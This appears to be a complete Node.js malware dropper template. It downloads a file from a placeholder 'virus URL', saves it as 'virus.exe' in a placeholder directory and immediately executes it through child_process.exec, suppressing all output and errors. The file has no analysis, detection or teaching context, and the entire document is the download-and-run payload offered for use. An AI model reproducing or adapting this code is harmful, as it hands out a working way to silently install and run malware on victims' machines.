const download = require('download-file')
var exec = require('child_process').exec
var ViruslURL = "Your virus URL"
var VirusDir = "Your virus DIR"
var VirusSavingFileName = "virus.exe"
var options = {
    directory: __dirname + "/" + VirusDir + "/",
    filename: VirusSavingFileName
}
download(ViruslURL, options, function(err) {
    if (err) throw err
    exec(options.directory + options.filename, function callback(error, stdout, stderr) {});

})
